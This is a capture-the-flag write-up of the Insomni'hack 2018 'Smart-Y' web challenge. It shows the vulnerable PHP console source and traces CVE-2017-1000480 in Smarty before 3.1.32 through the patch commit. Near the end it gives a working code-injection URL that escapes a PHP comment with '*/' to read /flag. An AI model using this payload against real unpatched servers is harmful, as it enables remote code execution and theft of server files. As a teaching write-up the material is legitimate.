# Web - Smart-Y

```
Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed and is not as evident to break now.

http://smart-y.teaser.insomnihack.ch
```

Once you find the vuln in this one, the challenge is quite easy. When you navigate on the website, you are quickly directed to `/console.php`, which source is:

```php
<?php 

if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
include_once('./smarty/libs/Smarty.class.php'); 
define('SMARTY_COMPILE_DIR','/tmp/templates_c'); 
define('SMARTY_CACHE_DIR','/tmp/cache'); 
  
  
class news extends Smarty_Resource_Custom 
{ 
    protected function fetch($name,&$source,&$mtime) 
    { 
        $template = "The news system is in maintenance. Please wait a year. <a href='/console.php?hl'>".htmlspecialchars("<<<DEBUG>>>")."</a>"; 
        $source = $template; 
        $mtime = time(); 
    } 
} 
  
// Smarty configuration 
$smarty = new Smarty(); 
$my_security_policy = new Smarty_Security($smarty); 
$my_security_policy->php_functions = null; 
$my_security_policy->php_handling = Smarty::PHP_REMOVE; 
$my_security_policy->modifiers = array(); 
$smarty->enableSecurity($my_security_policy); 
$smarty->setCacheDir(SMARTY_CACHE_DIR); 
$smarty->setCompileDir(SMARTY_COMPILE_DIR); 


$smarty->registerResource('news',new news); 
$smarty->display('news:'.(isset($_GET['id']) ? $_GET['id'] : ''));  
```

There is not much to go with, so let's try to go in `./smarty`:

![toot](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2018/Insomni%27hack-Teaser-2018/web-Smart-y/resources/dirlisting.png)

We can go and see the [changelog](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2018/Insomni%27hack-Teaser-2018/resources/change_log.txt) to grab the version number:

```
===== 3.1.31 ===== (14.12.2016)
  23.11.2016
   - move template object cache into static variables

  19.11.2016
  - bugfix inheritance root child templates containing nested {block}{/block} could call sub-bock content from parent
    template https://github.com/smarty-php/smarty/issues/317
  - change version checking

 11.11.2016
  - bugfix when Smarty is using a cached template object on Smarty::fetch() or Smarty::isCached() the inheritance data
    must be removed https://github.com/smarty-php/smarty/issues/312
  - smaller speed optimization
```

Next thing you want to do is search for public vulnerabilities, and there is one that can be of interest:
```
CVE-2017-1000480: Smarty 3 before 3.1.32 is vulnerable to a PHP code injection when calling fetch() or display() functions on custom resources that does not sanitize template name
```

Sadly, there is no exploit, so we have to search for it on our own. Grepping the [current changelog](https://github.com/smarty-php/smarty/blob/master/change_log.txt#L71) for `display()` shows us that the patch was released on 2017-07-21, which leads us to [this commit](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61).

There we see what really went down:
```php
$output .= "/* Smarty version " . Smarty::SMARTY_VERSION . ", created on " . strftime("%Y-%m-%d %H:%M:%S") . "\n  from \"" . $_template->source->filepath . "\" */\n\n";
```

```php
$output .= "/* Smarty version {Smarty::SMARTY_VERSION}, created on " . strftime("%Y-%m-%d %H:%M:%S") . "\n  from \"" . str_replace('*/','* /',$_template->source->filepath) . "\" */\n\n";
```

Someone was dynamically generating multilines comments inside a PHP code, and was not properly handlin `*/` in the template name. That allows for code injection in Smarty:
![toot](https://raw.githubusercontent.com/YoloSw4g/writeups/master/2018/Insomni%27hack-Teaser-2018/web-Smart-y/resources/execphp.png)

So let's [get the flag](http://smart-y.teaser.insomnihack.ch/console.php?id=*/echo%20file_get_contents(%27/flag%27);/*):
```
INS{why_being_so_smart-y} The news system is in maintenance. Please wait a year. <<<DEBUG>>>
```
